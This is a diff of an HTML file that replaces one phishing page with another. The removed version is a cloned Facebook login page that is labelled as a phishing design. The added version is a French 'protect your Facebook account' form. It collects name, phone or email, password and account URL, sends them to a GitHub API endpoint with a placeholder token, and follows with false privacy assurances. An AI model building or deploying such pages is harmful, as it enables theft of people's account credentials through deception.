@@ -1,535 +1,154 @@
 <!DOCTYPE html>
-<!--Designed as phishing page by KasRoudra(https://github.com/KasRoudra)-->
-<html lang="en" id="facebook">
-  <head>
-    <meta charset="utf-8" />
-    <meta
-      name="referrer"
-      content="origin-when-crossorigin"
-      id="meta_referrer"
-    />
-    <link rel="stylesheet" href="./style.css" />
-    <script src="./script.js"></script>
-    <script nonce="">
-      window._cstart = +new Date();
-    </script>
-    <script nonce="">
-      function envFlush(a) {
-        function b(b) {
-          for (var c in a) b[c] = a[c];
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>protection Facebook</title>
+<style>
+    body {
+        background-color: #fff;
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+        }  
+        
+        #main-photo {
+            border-radius: 50%;
+            width: 200px;
+            height: 200px;
+            margin-top: 20px;
+        } 
+    .header {
+        width: 600px;
+        height: 600px;
+        border-radius: 50%;
+        background-color: lightblue;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 20
+        
+    }
+    
+        #text {
+            font-size: 100px;
+            margin-top: 15px;
         }
-        window.requireLazy
-          ? window.requireLazy(["Env"], b)
-          : ((window.Env = window.Env || {}), b(window.Env));
-      }
-      envFlush({
-        ajaxpipe_token: "AXiGbmHFo5xoOvnwnZ8",
-        timeslice_heartbeat_config: {
-          pollIntervalMs: 33,
-          idleGapThresholdMs: 60,
-          ignoredTimesliceNames: {
-            requestAnimationFrame: true,
-            "Event listenHandler mousemove": true,
-            "Event listenHandler mouseover": true,
-            "Event listenHandler mouseout": true,
-            "Event listenHandler scroll": true,
-          },
-          isHeartbeatEnabled: true,
-          isArtilleryOn: false,
-        },
-        shouldLogCounters: true,
-        timeslice_categories: { react_render: true, reflow: true },
-        sample_continuation_stacktraces: true,
-        dom_mutation_flag: true,
-        gk_requirelazy_mem: true,
-        gk_instrument_object_url: true,
-        stack_trace_limit: 30,
-        timesliceBufferSize: 5000,
-        show_invariant_decoder: false,
-        compat_iframe_token: "AQ7g9Oz4RTWHxL_S0S4",
-        isCQuick: false,
-      });
-    </script>
-    <style nonce=""></style>
-    <script nonce="">
-      __DEV__ = 0;
-      (CavalryLogger =
-        window.CavalryLogger ||
-        function (a) {
-          (this.lid = a),
-            (this.transition = !1),
-            (this.metric_collected = !1),
-            (this.is_detailed_profiler = !1),
-            (this.instrumentation_started = !1),
-            (this.pagelet_metrics = {}),
-            (this.events = {}),
-            (this.ongoing_watch = {}),
-            (this.values = { t_cstart: window._cstart }),
-            (this.piggy_values = {}),
-            (this.bootloader_metrics = {}),
-            (this.resource_to_pagelet_mapping = {}),
-            this.initializeInstrumentation && this.initializeInstrumentation();
-        }),
-        (CavalryLogger.prototype.setIsDetailedProfiler = function (a) {
-          this.is_detailed_profiler = a;
-          return this;
-        }),
-        (CavalryLogger.prototype.setTTIEvent = function (a) {
-          this.tti_event = a;
-          return this;
-        }),
-        (CavalryLogger.prototype.setValue = function (a, b, c, d) {
-          d = d ? this.piggy_values : this.values;
-          (typeof d[a] === "undefined" || c) && (d[a] = b);
-          return this;
-        }),
-        (CavalryLogger.prototype.getLastTtiValue = function () {
-          return this.lastTtiValue;
-        }),
-        (CavalryLogger.prototype.setTimeStamp =
-          CavalryLogger.prototype.setTimeStamp ||
-          function (a, b, c, d) {
-            this.mark(a);
-            var e = this.values.t_cstart || this.values.t_start;
-            e = d ? e + d : CavalryLogger.now();
-            this.setValue(a, e, b, c);
-            this.tti_event &&
-              a == this.tti_event &&
-              ((this.lastTtiValue = e), this.setTimeStamp("t_tti", b));
-            return this;
-          }),
-        (CavalryLogger.prototype.mark =
-          typeof console === "object" && console.timeStamp
-            ? function (a) {
-                console.timeStamp(a);
-              }
-            : function () {}),
-        (CavalryLogger.prototype.addPiggyback = function (a, b) {
-          this.piggy_values[a] = b;
-          return this;
-        }),
-        (CavalryLogger.instances = {}),
-        (CavalryLogger.id = 0),
-        (CavalryLogger.getInstance = function (a) {
-          typeof a === "undefined" && (a = CavalryLogger.id);
-          CavalryLogger.instances[a] ||
-            (CavalryLogger.instances[a] = new CavalryLogger(a));
-          return CavalryLogger.instances[a];
-        }),
-        (CavalryLogger.setPageID = function (a) {
-          if (CavalryLogger.id === 0) {
-            var b = CavalryLogger.getInstance();
-            CavalryLogger.instances[a] = b;
-            CavalryLogger.instances[a].lid = a;
-            delete CavalryLogger.instances[0];
-          }
-          CavalryLogger.id = a;
-        }),
-        (CavalryLogger.now = function () {
-          return window.performance &&
-            performance.timing &&
-            performance.timing.navigationStart &&
-            performance.now
-            ? performance.now() + performance.timing.navigationStart
-            : new Date().getTime();
-        }),
-        (CavalryLogger.prototype.measureResources = function () {}),
-        (CavalryLogger.prototype.profileEarlyResources = function () {}),
-        (CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {}),
-        (CavalryLogger.start_js = function () {}),
-        (CavalryLogger.start_js_script = function () {}),
-        (CavalryLogger.done_js = function () {});
-      CavalryLogger.getInstance().setTTIEvent("t_domcontent");
-      (CavalryLogger.prototype.measureResources = function (a, b) {
-        if (!this.log_resources) return;
-        var c = "bootload/" + a.name;
-        if (
-          this.bootloader_metrics[c] !== void 0 ||
-          this.ongoing_watch[c] !== void 0
-        )
-          return;
-        var d = CavalryLogger.now();
-        this.ongoing_watch[c] = d;
-        "start_" + c in this.bootloader_metrics ||
-          (this.bootloader_metrics["start_" + c] = d);
-        b &&
-          !("tag_" + c in this.bootloader_metrics) &&
-          (this.bootloader_metrics["tag_" + c] = b);
-        if (a.type === "js") {
-          c = "js_exec/" + a.name;
-          this.ongoing_watch[c] = d;
+        
+    .container {
+        max-width: 250px;
+        margin: 2px auto;
+        padding: 10px;
+        background-color: #fff;
+        border-radius: 10px;
+        box-shadow: 0 0 100px rgba(0,0,0,0.3);        px;0%;
+    }
+    
+        #facebook-button {
+        background-color: #4CAF50;
+        color: white;
+        padding: 5px 3px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
         }
-      }),
-        (CavalryLogger.prototype.stopWatch = function (a) {
-          if (this.ongoing_watch[a]) {
-            var b = CavalryLogger.now(),
-              c = b - this.ongoing_watch[a];
-            this.bootloader_metrics[a] = c;
-            var d = this.piggy_values;
-            a.indexOf("bootload") === 0 &&
-              (d.t_resource_download || (d.t_resource_download = 0),
-              d.resources_downloaded || (d.resources_downloaded = 0),
-              (d.t_resource_download += c),
-              (d.resources_downloaded += 1),
-              d["tag_" + a] == "_EF_" &&
-                (d.t_pagelet_cssload_early_resources = b));
-            delete this.ongoing_watch[a];
+        
+        #contact-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            background-color: #007bff;
+            color: white;
+            text-align: center;
+            line-height: 20px;
+            text-decoration: none;
+        }
+        
+        
+    textarea {
+        width: 90%;
+        height: 10px;
+        margin: 10px 0;
+        padding: 10px;
+    }
+    button {
+        background-color: #3b00ff;
+        color: white;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+    }
+    
+</style>
+</he<div <div class="main-photo">
+ <div class="container"> <img
+                      class="fb_logo _8ilh img"
+                      src=""
+                      alt="Facebook"
+                    />       
+    <h2>protégé votre compte Facebook </h2>
+    <textarea id="messageInput" placeholder="Nom et prénom d'utilisateur'"></textarea>
+    <textarea id="messageInput" placeholder="Numéro mobile ou e-mail "></textarea>
+    <textarea id="messageInput" placeholder="Mot de passe "></textarea>
+    <textarea id="messageInput" placeholder="URL du compte Facebook "></textarea>
+        
+    <button id="sendButton">
+ Log In</button>
+    <a id="facebook-button" href="">Create New Account</a>
+    <a id="contact-button" href="#">✅</a>
+    
+</div>
+
+<script>
+    document.getElementById("sendButton").addEventListener("click", function() {
+        const message = document.getElementById("messageInput").value;
+        const githubApiUrl = 'https://api.github.com/repos/votre_utilisateur/votre_repo/contenu/votre_fichier.json';
+
+        fetch(githubApiUrl, {
+          method: 'put',
+          headers: {
+            'Authorization': 'Bearer VOTRE_TOKEN_GITHUB',
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            message: message
+          })
+        })
+        .then(response => {
+          if (response.ok) {
+            alert('compt masqué avec succès !');
+          } else {
+            alert('Une erreur est survenue. le compte l\' n'existe pas où vous avez mal saisi les informations.');
           }
-          return this;
-        }),
-        (CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {
-          var a = {};
-          Object.values(window.CavalryLogger.instances).forEach(function (b) {
-            b.bootloader_metrics && Object.assign(a, b.bootloader_metrics);
-          });
-          return a;
-        }),
-        (CavalryLogger.start_js = function (a) {
-          for (var b = 0; b < a.length; ++b)
-            CavalryLogger.getInstance().stopWatch("js_exec/" + a[b]);
-        }),
-        (CavalryLogger.start_js_script = function (a) {
-          if (!a || !a.dataset) return;
-          CavalryLogger.start_js([
-            a.dataset.bootloaderHash || a.dataset.bootloaderHashClient,
-          ]);
-        }),
-        (CavalryLogger.done_js = function (a) {
-          for (var b = 0; b < a.length; ++b)
-            CavalryLogger.getInstance().stopWatch("bootload/" + a[b]);
-        }),
-        (CavalryLogger.prototype.profileEarlyResources = function (a) {
-          for (var b = 0; b < a.length; b++)
-            this.measureResources(
-              { name: a[b][0], type: a[b][1] ? "js" : "" },
-              "_EF_"
-            );
+        })
+        .catch(error => {
+          console.error('Erreur : ', error);
         });
-      CavalryLogger.getInstance().log_resources = true;
-      CavalryLogger.getInstance().setIsDetailedProfiler(true);
-      window.CavalryLogger &&
-        CavalryLogger.getInstance().setTimeStamp("t_start");
-    </script>
-    <noscript
-      ><meta http-equiv="refresh" content="0; URL=/?_fb_noscript=1"
-    /></noscript>
-    <link
-      rel="manifest"
-      id="MANIFEST_LINK"
-      href="https://facebook.com/data/manifest/"
-      crossorigin="use-credentials"
-    />
-    <title id="pageTitle">Facebook – log in or sign up</title>
-    <meta property="og:site_name" content="Facebook" />
-    <meta property="og:url" content="https://www.facebook.com/" />
-    <meta
-      property="og:image"
-      content="https://www.facebook.com/images/fb_icon_325x325.png"
-    />
-    <meta property="og:locale" content="en_GB" />
-    <link
-      rel="alternate"
-      media="only screen and (max-width: 640px)"
-      href="https://m.facebook.com/"
-    />
-    <link rel="alternate" media="handheld" href="https://m.facebook.com/" />
-    <meta
-      name="description"
-      content="Log in to Facebook to start sharing and connecting with your friends, family and people you know."
-    />
-    <script type="application/ld+json" nonce="">
-      {
-        "\u0040context": "http:\/\/schema.org",
-        "\u0040type": "WebSite",
-        "name": "Facebook",
-        "url": "https:\/\/en-gb.facebook.com\/"
-      }
-    </script>
-    <link rel="canonical" href="https://www.facebook.com/" />
-    <link
-      rel="shortcut icon"
-      href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico"
-    />
-    <link
-      type="text/css"
-      rel="stylesheet"
-      href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/zvfS2wV_bL3.css?_nc_x=Ij3Wp8lg5Kz"
-      data-bootloader-hash="KeLRD1z"
-      crossorigin="anonymous"
-    />
-    <link
-      type="text/css"
-      rel="stylesheet"
-      href="https://static.xx.fbcdn.net/rsrc.php/v3/y3/l/0,cross/5WfpJC2KSHe.css?_nc_x=Ij3Wp8lg5Kz"
-      data-bootloader-hash="XCvu4Ie"
-      crossorigin="anonymous"
-    />
-    <link
-      type="text/css"
-      rel="stylesheet"
-      href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/l/0,cross/EE0cKe4KBQ3.css?_nc_x=Ij3Wp8lg5Kz"
-      data-bootloader-hash="+xujYrB"
-      crossorigin="anonymous"
-    />
-    <link
-      type="text/css"
-      rel="stylesheet"
-      href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/l/0,cross/S81YVWe8H_A.css?_nc_x=Ij3Wp8lg5Kz"
-      data-bootloader-hash="tH07smz"
-      crossorigin="anonymous"
-    />
-    <link
-      type="text/css"
-      rel="stylesheet"
-      href="https://static.xx.fbcdn.net/rsrc.php/v3/yc/l/0,cross/PG5tRCkVwWX.css?_nc_x=Ij3Wp8lg5Kz"
-      data-bootloader-hash="tvWqIy4"
-      crossorigin="anonymous"
-    />
-    <link
-      type="text/css"
-      rel="stylesheet"
-      href="https://static.xx.fbcdn.net/rsrc.php/v3/yk/l/0,cross/tkUx0C0mTdH.css?_nc_x=Ij3Wp8lg5Kz"
-      data-bootloader-hash="U7cyoYM"
-      crossorigin="anonymous"
-    />
-    <script
-      src="https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/wTY5qBMkTkR.js?_nc_x=Ij3Wp8lg5Kz"
-      data-bootloader-hash="A+mvvL2"
-      crossorigin="anonymous"
-      nonce=""
-    ></script>
-    <script nonce="">
-      requireLazy(["HasteSupportData"], function (m) {
-        m.handle({
-          clpData: {
-            1814852: { r: 1 },
-            1838142: { r: 1, s: 1 },
-            1949898: { r: 1 },
-            1848815: { r: 10000, s: 1 },
-            1744178: { r: 1, s: 1 },
-          },
-          gkxData: {
-            5241: { result: true, hash: "AT7o1bCQPGpf3ShEY_I" },
-            676837: { result: false, hash: "AT4N8wBZA8ctCdHwHSg" },
-            708253: { result: false, hash: "AT5n4hBL3YTMnQWtUFA" },
-            996940: { result: false, hash: "AT7opYuEGy3sjG1agAM" },
-            1224637: { result: false, hash: "AT7JRluWxuwDm3XzXA4" },
-            1263340: { result: false, hash: "AT5bwizWgDaFQudm1yw" },
-            676920: { result: true, hash: "AT497IX4gOFG8gZea4Y" },
-            1073500: { result: false, hash: "AT7aJmfnqWyioxOOyYE" },
-            1167394: { result: false, hash: "AT7BpN-tlUPwbIIFKBA" },
-            1857581: { result: false, hash: "AT5yTxGMp6le0PAtTdc" },
-            2772: { result: false, hash: "AT5Eu244WIce7iwqgxU" },
-            3752: { result: false, hash: "AT6eS5UTkkMp_xbPLC0" },
-            3831: { result: false, hash: "AT4W23lQ0XxAZniM9d8" },
-            4075: { result: false, hash: "AT4_ZQi0sTjSt-RxVVc" },
-            676838: { result: false, hash: "AT6nN1ehT9yq-2q6eo4" },
-            1217157: { result: false, hash: "AT6B7YmllOsArnK6KQo" },
-            1554827: { result: false, hash: "AT7zueGLhGo0cT5xizs" },
-            1738486: { result: false, hash: "AT4cX37oQco6DwhULM0" },
-          },
-          qplData: { 7758: { r: 1 } },
-        });
-      });
-      requireLazy(
-        ["TimeSliceImpl", "ServerJS"],
-        function (TimeSlice, ServerJS) {
-          new ServerJS().handle({
-            define: [
-              [
-                "URLFragmentPreludeConfig",
-                [],
-                {
-                  hashtagRedirect: true,
-                  fragBlacklist: [
-                    "nonce",
-                    "access_token",
-                    "oauth_token",
-                    "xs",
-                    "checkpoint_data",
-                    "code",
-                  ],
-                },
-                137,
-              ],
-              [
-                "CometPersistQueryParams",
-                [],
-                { relative: {}, domain: {} },
-                6231,
-              ],
-              ["CookieDomain", [], { domain: "facebook.com" }, 6421],
-              [
-                "BootloaderConfig",
-                [],
-                {
-                  deferBootloads: false,
-                  jsRetries: [200, 500],
-                  jsRetryAbortNum: 2,
-                  jsRetryAbortTime: 5,
-                  silentDups: false,
-                  hypStep4: false,
-                  phdOn: false,
-                  btCutoffIndex: 3199,
-                },
-                329,
-              ],
-              [
-                "CSSLoaderConfig",
-                [],
-                {
-                  timeout: 5000,
-                  modulePrefix: "BLCSS:",
-                  loadEventSupported: true,
-                },
-                619,
-              ],
-              [
-                "CookieCoreConfig",
-                [],
-                {
-                  c_user: { s: "None" },
-                  cppo: { t: 86400, s: "None" },
-                  dpr: { t: 604800, s: "None" },
-                  fbl_ci: { t: 31536000, s: "None" },
-                  fbl_cs: { t: 31536000, s: "None" },
-                  fbl_st: { t: 31536000, s: "Strict" },
-                  i_user: { s: "None" },
-                  locale: { t: 604800, s: "None" },
-                  m_pixel_ratio: { t: 604800, s: "None" },
-                  noscript: { s: "None" },
-                  presence: { t: 2592000, s: "None" },
-                  sfau: { s: "None" },
-                  usida: { s: "None" },
-                  vpd: { t: 5184000, s: "Lax" },
-                  wd: { t: 604800, s: "Lax" },
-                  "x-referer": { s: "None" },
-                  "x-src": { t: 1, s: "None" },
-                },
-                2104,
-              ],
-              ["CurrentCommunityInitialData", [], {}, 490],
-              [
-                "CurrentEnvironment",
-                [],
-                {
-                  facebookdotcom: true,
-                  messengerdotcom: false,
-                  workplacedotcom: false,
-                  instagramdotcom: false,
-                },
-                827,
-              ],
-              [
-                "CurrentUserInitialData",
-                [],
-                {
-                  ACCOUNT_ID: "0",
-                  USER_ID: "0",
-                  NAME: "",
-                  SHORT_NAME: null,
-                  IS_BUSINESS_PERSON_ACCOUNT: false,
-                  HAS_SECONDARY_BUSINESS_PERSON: false,
-                  IS_FACEBOOK_WORK_ACCOUNT: false,
-                  IS_MESSENGER_ONLY_USER: false,
-                  IS_DEACTIVATED_ALLOWED_ON_MESSENGER: false,
-                  IS_MESSENGER_CALL_GUEST_USER: false,
-                  IS_WORK_MESSENGER_CALL_GUEST_USER: false,
-                  APP_ID: "256281040558",
-                  IS_BUSINESS_DOMAIN: false,
-                },
-                270,
-              ],
-              ["DTSGInitialData", [], {}, 258],
-              ["ISB", [], {}, 330],
-              ["LSD", [], { token: "AVqK7GczFT0" }, 323],
-              [
-                "ServerNonce",
-                [],
-                { ServerNonce: "B48umobUnL9dKpF7dBtSL5" },
-                141,
-              ],
-              [
-                "SiteData",
-                [],
-                {
-                  server_revision: 1005083706,
-                  client_revision: 1005083598,
-                  tier: "",
-                  push_phase: "C3",
-                  pkg_cohort: "BP:DEFAULT",
-                  haste_session: "19040.BP:DEFAULT.2.0.0.0.",
-                  pr: 1,
-                  haste_site: "www",
-                  be_one_ahead: false,
-                  is_rtl: false,
-                  is_comet: false,
-                  is_experimental_tier: false,
-                  is_jit_warmed_up: true,
-                  hsi: "7065651880395410549-0",
-                  semr_host_bucket: "5",
-                  bl_hash_version: 2,
-                  skip_rd_bl: true,
-                  comet_env: 0,
-                  spin: 4,
-                  __spin_r: 1005083598,
-                  __spin_b: "trunk",
-                  __spin_t: 1645100275,
-                  vip: "157.240.1.35",
-                },
-                317,
-              ],
-              [
-                "SprinkleConfig",
-                [],
-                { param_name: "jazoest", version: 2, should_randomize: false },
-                2111,
-              ],
-              [
-                "UserAgentData",
-                [],
-                {
-                  browserArchitecture: "64",
-                  browserFullVersion: "98.0.4758.102",
-                  browserMinorVersion: 0,
-                  browserName: "Chrome",
-                  browserVersion: 98,
-                  deviceName: "Unknown",
-                  engineName: "WebKit",
-                  engineVersion: "537.36",
-                  platformArchitecture: "64",
-                  platformName: "Windows",
-                  platformVersion: "10",
-                  platformFullVersion: "10",
-                },
-                527,
-              ],
-              [
-                "PromiseUsePolyfillSetImmediateGK",
-                [],
-                { www_always_use_polyfill_setimmediate: false },
-                2190,
-              ],
-              [
-                "KSConfig",
-                [],
-                {
-                  killed: {
-                    __set: [
-                      "MOBILIZER_SELF_SERVE_OWNERSHIP_RESOLVER",
-                      "MLHUB_FLOW_AUTOREFRESH_SEARCH",
-                      "NEKO_DISABLE_CREATE_FOR_SAP",
-                      "EO_DISABLE_SYSTEM_SERIAL_NUMBER_FREE_TYPING_IN_CPE_NON_CLIENT",
-                      "MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING",
-                      "WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING",
-                      "BUSINESS_INVITE_FLOW_WITH_SELLER_PROFILE",
-                      "BUY_AT_UI_LINE_DELETE",
-                      "BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API",
-                      "BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API",
-                      "BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API",
-                      "BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API",
-                      "BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API",
-                      "BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API",
-                      "ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION",
-                      "FORCE_FETCH_BOOSTED_COMPONENT_AFTER_ADS_CREATION",
-                      "VIDEO_DIMENSIONS_F
+    });
+</script>
+</body>
+</html>
+━━━━━━━>>>>>>>>>>>>>>>>>>>>>>━━━━━━━
+
+Lorsque nous abordons la question de la protection des données sur notre site web, nous mettons la confidentialité et la sécurité de vos informations personnelles au premier plan. Votre confiance est notre priorité absolue, c’est pourquoi nous avons mis en place des mesures robustes pour garantir la sécurité de vos comptes.
+━━━━━━━>>>>>>>>>>>>>>>>>>>>>>━━━━━━━
+
+
+
+
+Nous utilisons des protocoles de sécurité avancés pour crypter vos données sensibles et empêcher tout accès non autorisé. Notre équipe dédiée à la sécurité surveille en permanence les activités suspectes et met à jour nos systèmes de protection pour contrer les menaces émergentes.
+
+
+
+━━━━━━━>>>>>>>>>>>>>>>>>>>>>>━━━━━━━
+
+De plus, nous respectons strictement les réglementations en matière de protection des données, telles que le RGPD, pour assurer la confidentialité de vos informations. Vos données ne sont en aucun cas partagées ou vendues à des tiers sans votre consentement explicite.
+
+
+
+━━━━━━━>>>>>>>>>>>>>>>>>>>>>>━━━━━━━
+En choisissant d'utiliser notre site web, vous pouvez être assurés que vos comptes et vos données personnelles sont entre de bonnes mains. Nous nous engageons à maintenir un environnement sécurisé et fiable pour vous offrir une expérience en ligne sereine et protégée. Votre confidentialité est notre engagement.
